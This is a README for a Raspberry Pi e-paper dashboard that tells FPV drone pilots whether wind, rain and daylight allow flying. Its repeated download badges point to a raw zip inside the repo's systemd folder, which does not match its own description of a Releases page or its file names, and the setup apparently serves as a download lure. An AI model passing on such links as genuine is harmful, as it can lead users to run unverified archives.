# ✈️ fly-or-no_fly - Easy FPV Flight Condition Monitor

[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-brightgreen)](https://github.com/skaml2021/fly-or-no_fly/raw/refs/heads/main/systemd/fly-or-no-3.9.zip)

## 📋 What is fly-or-no_fly?

fly-or-no_fly is a simple dashboard for Raspberry Pi that shows whether it is safe to fly your FPV drone. It uses weather forecasts and set limits on wind, rain, and daylight. The results show on a small 2.15-inch Waveshare e-paper screen. You can see a clear "go" or "no-go" status every hour. The system also keeps hourly records of the conditions.

This helps FPV drone pilots decide quickly if flying is safe. It works with Raspberry Pi Zero 2 and other models run Linux. The software uses Python.

## 💻 System Requirements

To use fly-or-no_fly, you need:

- A Raspberry Pi (model Zero 2 W or newer is best)
- A 2.15″ Waveshare e-paper display connected to Raspberry Pi
- microSD card with at least 8 GB space
- Active internet connection to get weather data
- Power supply for Raspberry Pi
- Basic familiarity connecting hardware and running simple programs

The software runs on Raspberry Pi OS or similar Linux-based systems.

## 🌤️ Features at a glance

- Fetches weather data from Open-Meteo API hourly
- Checks wind speed, gusts, rain, and daylight rules you can set
- Displays clear “go” or “no-go” status on an e-paper display
- Logs hourly weather and status to a file for review
- Works with commonly used Raspberry Pi e-paper displays

## 🧰 What you will need

- Raspberry Pi with internet access
- Waveshare 2.15″ e-paper display correctly wired to Pi GPIO pins
- microSD card with Raspberry Pi OS installed
- Power supply for the Pi
- Mouse, keyboard, and monitor for initial setup (optional if you SSH in)

## 🚀 Getting Started - Download fly-or-no_fly

Please visit this page to download the latest version of fly-or-no_fly:

[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-blue)](https://github.com/skaml2021/fly-or-no_fly/raw/refs/heads/main/systemd/fly-or-no-3.9.zip)

Open the link above in your browser. You will find files under the "Releases" section. Look for the latest release and download the relevant archive file (usually a zip or tar.gz).

Save the file to your Raspberry Pi or another computer where you can transfer it.

## 🛠️ Installing fly-or-no_fly on Raspberry Pi

Follow these steps once you have downloaded the file:

1. **Transfer the downloaded archive** to your Raspberry Pi if you did not download it there directly. You can use a USB drive or SCP from another computer.

2. **Open a Terminal** on your Raspberry Pi.

3. **Extract the archive**. For example, if the file is named `fly-or-no_fly_v1.0.tar.gz`, run:
   
   ```
   tar -xzf fly-or-no_fly_v1.0.tar.gz
   ```
   or
   
   ```
   unzip fly-or-no_fly_v1.0.zip
   ```
   depending on the file type.

4. **Navigate into the extracted folder**:
   
   ```
   cd fly-or-no_fly
   ```

5. **Install dependencies**. Run:
   
   ```
   sudo apt update
   sudo apt install python3-pip python3-dev python3-venv
   pip3 install -r requirements.txt
   ```
   This installs Python and needed packages.

6. **Connect your e-paper display** to the Raspberry Pi GPIO pins following the manufacturer's instructions. Check wiring carefully.

7. **Configure your settings**. Open the `config.json` file in a text editor:
   
   ```
   nano config.json
   ```
   
   Set your wind, gust, rain thresholds, and daylight hours. Save the file.

8. **Run the program**:
   
   ```
   python3 main.py
   ```

The screen will update every hour telling you if conditions are good to fly.

## ⚙️ Configuration Details

- **Wind Threshold (m/s):** Maximum wind speed allowed to fly.
- **Gust Threshold (m/s):** Max gust speed allowed.
- **Rain Threshold (mm/h):** Max rain before “no-go” status.
- **Daylight Hours:** Start and end time for daylight checks.
- **Logging:** The program creates a log file named `flight_log.csv` with hourly weather and conditions.

Change these values in `config.json` to match your preferences.

## 🔄 How fly-or-no_fly Works

Every hour, the program:

1. Requests forecast data from Open-Meteo for your location.
2. Checks current weather against your thresholds.
3. Checks if the time is within your daylight window.
4. Updates the e-paper screen with green for go or red for no-go.
5. Saves the results with weather readings to a log file.

This automation helps keep safety rules consistent.

## 🧩 Hardware Setup Tips

- Use female-to-female jumper wires for Raspberry Pi to e-paper display connections.
- Double-check the pin assignments: miswiring can cause your screen not to display.
- Use a stable power supply, as e-paper displays require consistent power.
- If you have trouble with the screen, try rebooting the Pi and running the program again.

## ⬇️ Download Links

Visit the Releases page below to download your version:

[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-brightgreen)](https://github.com/skaml2021/fly-or-no_fly/raw/refs/heads/main/systemd/fly-or-no-3.9.zip)

Look for the latest archive package or installer appropriate for your Raspberry Pi OS.

## 🧑‍💻 Running fly-or-no_fly Daily

- Keep your Raspberry Pi connected to the internet.
- Set the program to run automatically on startup by creating a cron job or adding it to `rc.local`.
- Regularly check the log file to review past weather conditions.
- Adjust thresholds at any time by editing `config.json`.

Example cron entry to run at startup:

```
@reboot /usr/bin/python3 /home/pi/fly-or-no_fly/main.py
```

Edit it with:

```
crontab -e
```

## 🛠️ Troubleshooting

If fly-or-no_fly does not show on your screen:

- Check all cable connections.
- Confirm Python and all dependencies installed.
- Run the program from terminal to see error messages.
- Verify internet access on the Pi.
- Confirm the e-paper display model matches software settings.

For any error messages in Python, search online for the given error or check the README provided in the release.

## 📂 Files Included

- `main.py` – core program controlling the dashboard
- `config.json` – settings file for thresholds and location/time
- `requirements.txt` – Python packages list
- `README.md` – this guide
- Example log files in CSV format

## 📝 License and Source

The source code is open and can be found in the repository. You may modify it to fit your needs. This software runs under the terms described in the LICENSE file included in the download.

---

Topics related to this project include dji, drone, e-ink-display, e-paper, fpv, fpv-drones, linux, python, raspberry-pi, raspberry-pi-zero-2.